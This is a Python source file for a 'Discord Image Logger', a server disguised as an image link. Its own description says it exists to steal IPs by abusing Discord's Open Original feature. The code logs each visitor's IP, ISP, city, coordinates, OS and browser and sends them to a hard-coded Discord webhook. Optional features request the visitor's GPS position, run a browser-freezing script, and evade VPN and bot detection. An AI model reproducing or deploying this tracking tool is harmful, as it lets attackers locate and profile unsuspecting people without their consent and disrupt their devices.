# Discord Image Logger
# By DeKrypt | https://github.com/dekrypted

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1335381790428237950/3v1vESGzqAjURSvFLGDF7Cx9PcaFfx5aVVXx2o1Upj_PDWkuPm64aKZDEx-9vlVCd4OX",
    "image": "data:image/jpeg;base64,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", # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "Image Logger", # Set this to the name you want the webhook to have
    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)

    # OPTIONS #
    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
    
    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.

    "message": { # Show a custom message when the user opens the image
        "doMessage": False, # Enable the custom message?
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
        "richMessage": True, # Enable rich text? (See README for more info)
    },

    "vpnCheck": 1, # Prevents VPNs from triggering the alert
                # 0 = No Anti-VPN
                # 1 = Don't ping when a VPN is suspected
                # 2 = Don't send an alert when a VPN is suspected

    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)

    "antiBot": 1, # Prevents bots from triggering the alert
                # 0 = No Anti-Bot
                # 1 = Don't ping when it's possibly a bot
                # 2 = Don't ping when it's 100% a bot
                # 3 = Don't send an alert when it's possibly a bot
                # 4 = Don't send an alert when it's 100% a bot
    

    # REDIRECTION #
    "redirect": {
        "redirect": False, # Redirect to a webpage?
        "page": "https://your-link.here" # Link to the webpage to redirect to 
    },

    # Please enter all values in correct format. Otherwise, it may break.
    # Do not edit anything below this, unless you know what you're doing.
    # NOTE: Hierarchy tree goes as follows:
    # 1) Redirect (If this is enabled, disables image and crash browser)
    # 2) Crash Browser (If this is enabled, disables image)
    # 3) Message (If this is enabled, disables image)
    # 4) Image 
}

blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                           # This feature is undocumented mainly due to it being for detecting bots better.

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Image Logger - Link Sent",
            "color": config["color"],
            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
        return

    ping = "@everyone"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
                return
        
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return

        if config["antiBot"] == 3:
                return

        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
                ping = ""


    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
```
{useragent}
```""",
    }
  ],
}
    
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                return
            
            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.

                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
                
                return
            
            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
                else:
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
                

                message = config["message"]["message"]

                if config["message"]["richMessage"] and result:
                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
                    message = message.replace("{isp}", result["isp"])
                    message = message.replace("{asn}", result["as"])
                    message = message.replace("{country}", result["country"])
                    message = message.replace("{region}", result["regionName"])
                    message = message.replace("{city}", result["city"])
                    message = message.replace("{lat}", str(result["lat"]))
                    message = message.replace("{long}", str(result["lon"]))
                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
                    message = message.replace("{mobile}", str(result["mobile"]))
                    message = message.replace("{vpn}", str(result["proxy"]))
                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])

                datatype = 'text/html'

                if config["message"]["doMessage"]:
                    data = message.encode()
                
                if config["crashBrowser"]:
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/dekrypted/Chromebook-Crasher

                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                self.send_response(200) # 200 = OK (HTTP Status)
                self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["accurateLocation"]:
                    data += b"""<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}

</script>"""
                self.wfile.write(data)
        
        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc())

        return
    
    do_GET = handleRequest
    do_POST = handleRequest

handler = app = ImageLoggerAPI
